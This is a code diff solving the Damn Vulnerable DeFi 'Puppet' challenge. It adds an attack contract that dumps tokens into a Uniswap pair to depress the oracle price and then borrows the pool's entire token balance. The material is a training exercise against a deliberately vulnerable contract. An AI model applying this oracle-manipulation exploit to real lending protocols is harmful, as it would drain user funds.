@@ -5,11 +5,11 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
 import "../DamnValuableToken.sol";
 
-/**
- * @title PuppetPool
- * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
- */
-contract PuppetPool is ReentrancyGuard {
+interface Iuniswap{
+    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
+}
+
+contract IPuppetPool is ReentrancyGuard {
     using Address for address payable;
 
     uint256 public constant DEPOSIT_FACTOR = 2;
@@ -56,10 +56,36 @@ contract PuppetPool is ReentrancyGuard {
     function calculateDepositRequired(uint256 amount) public view returns (uint256) {
         return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
     }
-    ///
-    //I'm guessing if send a bunch of eth or DVT to the uniswap contract we can make one of them worth significantly less and take them out - or continous swaps due to precision loss (rounding down as solidity does not do floats)
+    //I'm guessing if send a bunch of eth or DVT to the uniswap contract we can make one of them worth significantly less and take them out
     function _computeOraclePrice() private view returns (uint256) {
         // calculates the price of the token in wei according to Uniswap pair
         return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
     }
+}
+
+contract puppetPoolAttack{
+    IPuppetPool public immutable puppetPool;
+    Iuniswap public immutable uniswapPool;
+    address public immutable player;
+    DamnValuableToken public immutable token;
+    constructor(address _puppetPool, address _player, address _token, address _uniswapPool){
+        puppetPool = IPuppetPool(_puppetPool);
+        uniswapPool = Iuniswap(_uniswapPool);
+        token = DamnValuableToken(_token);
+        player = _player;
+    }
+
+    function attackPuppet() public payable{        
+        //step one deposit a lot of DVT to the publicly known oracle pool - ether is just a shortcut for 18 decimal num (10*18)
+        token.approve(address(uniswapPool), 1000 ether);
+        uniswapPool.tokenToEthTransferInput( 1000 ether, 9, block.timestamp, address(this));
+        //step 2 calculate how much we need
+        uint256 amountNeeded = puppetPool.calculateDepositRequired(100000 ether) ;
+        //uint256 tokenPrice = address(uniswapPool).balance * (10 ** 18) / token.balanceOf(address(uniswapPool));
+       // uint256 amountNeeded = 100000 ether * tokenPrice * 2 / 10 ** 18;
+        //step 3 borrow as much as we can
+        puppetPool.borrow{value: amountNeeded}(100000 ether, player);
+    }
+    receive() external payable {}
+
 }
